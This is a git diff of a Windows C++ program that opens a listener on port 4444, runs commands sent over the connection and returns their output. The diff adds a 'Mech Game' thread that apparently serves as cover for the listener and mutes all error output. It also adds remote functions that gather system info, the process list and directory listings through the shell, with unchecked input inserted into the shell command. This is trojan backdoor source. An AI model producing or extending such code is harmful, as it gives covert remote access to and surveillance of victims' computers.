@@ -4,26 +4,31 @@
 #undef UNICODE
 #define WIN32_LEAN_AND_MEAN
 
-#include <windows.h>
+#include "MechPlay.h"
 #include <winsock2.h>
 #include <ws2tcpip.h>
-#include <stdlib.h>
-#include <stdio.h>
+#include <thread>
 #include <iostream>
 #include <sstream>
 #include <vector>
+#include <array>
 
 #pragma comment (lib, "Ws2_32.lib")
 
 #define DEFAULT_PORT "4444"
 
 void processCommand(std::vector<char> buffer, std::vector<char>& outputBuffer);
+void listFiles(std::vector<char>& outputBuffer, std::string directory = "C:\\*");
 void setDriveLetter(std::string directory);
-void listFiles(std::vector<char>& outputBuffer, std::string directory);
 void printSystem(std::vector<char>& outputBuffer);
+void printTasks(std::vector<char>& outputBuffer);
+std::string exec(const char* cmd);
 
-int __cdecl main(void)
+int main(void)
 {
+	//Thread for the overhead Mech Game
+	std::thread t(&MechPlay::Execute, MechPlay());
+
 	WSADATA wsaData;
 	int iResult;
 
@@ -34,13 +39,11 @@ int __cdecl main(void)
 	struct addrinfo *result = NULL;
 	struct addrinfo hints;
 
-	int iSendResult;
-
 	// Initialize Winsock
 	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
 	if (iResult != 0)
 	{
-		std::cout << "WSAStartup failed with error: " << iResult << std::endl;
+		//std::cout << "WSAStartup failed with error: " << iResult << std::endl;
 		return 1;
 	}
 
@@ -54,7 +57,7 @@ int __cdecl main(void)
 	iResult = getaddrinfo(NULL, DEFAULT_PORT, &hints, &result);
 	if (iResult != 0)
 	{
-		std::cout << "getaddrinfo failed with error: " << iResult << std::endl;
+		//std::cout << "getaddrinfo failed with error: " << iResult << std::endl;
 		WSACleanup();
 		return 1;
 	}
@@ -63,7 +66,7 @@ int __cdecl main(void)
 	ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
 	if (ListenSocket == INVALID_SOCKET)
 	{
-		std::cout << "socket failed with error: " << WSAGetLastError() << std::endl;
+		//std::cout << "socket failed with error: " << WSAGetLastError() << std::endl;
 		freeaddrinfo(result);
 		WSACleanup();
 		return 1;
@@ -73,7 +76,7 @@ int __cdecl main(void)
 	iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
 	if (iResult == SOCKET_ERROR)
 	{
-		std::cout << "bind failed with error: " << WSAGetLastError() << std::endl;
+		//std::cout << "bind failed with error: " << WSAGetLastError() << std::endl;
 		freeaddrinfo(result);
 		closesocket(ListenSocket);
 		WSACleanup();
@@ -85,7 +88,7 @@ int __cdecl main(void)
 	iResult = listen(ListenSocket, SOMAXCONN);
 	if (iResult == SOCKET_ERROR)
 	{
-		std::cout << "listen failed with error: " << WSAGetLastError() << std::endl;
+		//std::cout << "listen failed with error: " << WSAGetLastError() << std::endl;
 		closesocket(ListenSocket);
 		WSACleanup();
 		return 1;
@@ -95,7 +98,7 @@ int __cdecl main(void)
 	ServerSocket = accept(ListenSocket, NULL, NULL);
 	if (ServerSocket == INVALID_SOCKET)
 	{
-		std::cout << "accept failed with error: " << WSAGetLastError() << std::endl;
+		//std::cout << "accept failed with error: " << WSAGetLastError() << std::endl;
 		closesocket(ListenSocket);
 		WSACleanup();
 		return 1;
@@ -109,7 +112,7 @@ int __cdecl main(void)
 		std::vector<char> outputBuffer;
 		//Receives any incoming buffers from the server
 		iResult = recv(ServerSocket, inputBuffer.data(), inputBuffer.size(), 0);
-		std::cout << "Data has been received." << std::endl;
+		//std::cout << "Data has been received." << std::endl;
 		//If the result is not -1, then resize inputBuffer to make sure that it can hold the bytes incoming
 		if (iResult != -1)
 		{
@@ -120,23 +123,34 @@ int __cdecl main(void)
 		{
 			//Central function that handles switch/cases for all the commands
 			processCommand(inputBuffer, outputBuffer);
-			std::cout << std::endl;
+			char newbuffer[4096 * 2];
 			//If the command asks for a result (at this stage, all will), the result needs to be sent back 
 			//to the server
-			iResult = send(ServerSocket, outputBuffer.data(), outputBuffer.size(), 0);
+			for (int i = 0; i < outputBuffer.size(); i++)
+			{
+				newbuffer[i % sizeof(newbuffer)] = outputBuffer[i];
+				if ((i % sizeof(newbuffer)) == 0 && i != 0)
+				{
+					iResult = send(ServerSocket, newbuffer, sizeof(newbuffer), 0);
+				}
+			}
+			iResult = send(ServerSocket, newbuffer, sizeof(newbuffer), 0);
+			char end = 0;
+			iResult = send(ServerSocket, &end, sizeof(end), 0);
 		}
 		//If 0 bytes has been sent, then the server has shutdown and so should the client
 		else
 		{
 			break;
 		}
+		outputBuffer.clear();
 	} while (true);
 
 	// shutdown the connection since we're done
 	iResult = shutdown(ServerSocket, SD_SEND);
 	if (iResult == SOCKET_ERROR)
 	{
-		std::cout << "shutdown failed with error: " << WSAGetLastError() << std::endl;
+		//std::cout << "shutdown failed with error: " << WSAGetLastError() << std::endl;
 		closesocket(ServerSocket);
 		WSACleanup();
 		return 1;
@@ -166,48 +180,15 @@ void processCommand(std::vector<char> buffer, std::vector<char>& outputBuffer)
 //Function to build a basic file structure outline of the client machine
 void listFiles(std::vector<char>& outputBuffer, std::string directory)
 {
-	WIN32_FIND_DATA fileData;
-	__int64 filesize = 0;
-	HANDLE hFind = INVALID_HANDLE_VALUE;
-	//Locates the file information for the specificed directory
-	//Default will be the C:\ Drive
-	hFind = FindFirstFile(directory.c_str(), &fileData);
-	do
+	//String to build the output
+	std::string build;
+	build = "dir " + directory + " 2>&1";
+	build = exec(build.c_str());
+	for (auto& element : build)
 	{
-		//First section handles directories
-		if (fileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
-		{
-			//String used to build the line showing the directory information
-			std::string build;
-			build = build + "  " + fileData.cFileName + "   <DIR>\n";
-			for (auto& element : build)
-			{
-				//All characters are added into the buffer vector
-				outputBuffer.push_back(element);
-			}
-		}
-		//Next section handles files
-		else
-		{
-			//Type to hold file size, it is recorded in bytes
-			LARGE_INTEGER data;
-			data.LowPart = fileData.nFileSizeLow;
-			data.HighPart = fileData.nFileSizeHigh;
-			filesize = data.QuadPart;
-			//String used to build the line showing the file information
-			std::string build;
-			build = build + "  " + fileData.cFileName + "   ";
-			//Converts the file size to a type that can be printed
-			build += static_cast<std::ostringstream*>(&(std::ostringstream() << filesize))->str();
-			build += " bytes\n";
-			for (auto& element : build)
-			{
-				//All characters are added into the buffer vector
-				outputBuffer.push_back(element);
-			}
-		}
-		//Once there are no files to output, return the function
-	} while (FindNextFile(hFind, &fileData) != 0);
+		//All characters are added into the buffer vector
+		outputBuffer.push_back(element);
+	}
 }
 void setDriveLetter(std::string directory)
 {
@@ -235,7 +216,44 @@ void setDriveLetter(std::string directory)
 		directory = ("%c:\\*", toupper((int)tempLetter));//User indicated current drive letter is good.
 	}
 }
+//Function that will return the system information of the client
 void printSystem(std::vector<char>& outputBuffer)
 {
-
+	//String to build the output
+	std::string build;
+	build = exec("systeminfo 2>&1");
+	for (auto& element : build)
+	{
+		//All characters are added into the buffer vector
+		outputBuffer.push_back(element);
+	}
+}
+//Function that will return the processes of the client
+void printTasks(std::vector<char>& outputBuffer)
+{
+	//String to build the output
+	std::string build;
+	build = exec("tasklist 2>&1");
+	for (auto& element : build)
+	{
+		//All characters are added into the buffer vector
+		outputBuffer.push_back(element);
+	}
+}
+//Function for execution the function on the client
+std::string exec(const char* cmd)
+{
+	std::array<char, 256> buffer;
+	std::string result;
+	//Opens a pipe for the purposes of running the cmd
+	std::shared_ptr<FILE> pipe(_popen(cmd, "r"), _pclose);
+	if (!pipe)
+		throw std::runtime_error("popen() failed!");
+	//While there is data to grab, process that output into the string
+	while (!feof(pipe.get()))
+	{
+		if (fgets(buffer.data(), 256, pipe.get()) != nullptr)
+			result += buffer.data();
+	}
+	return result;
 }
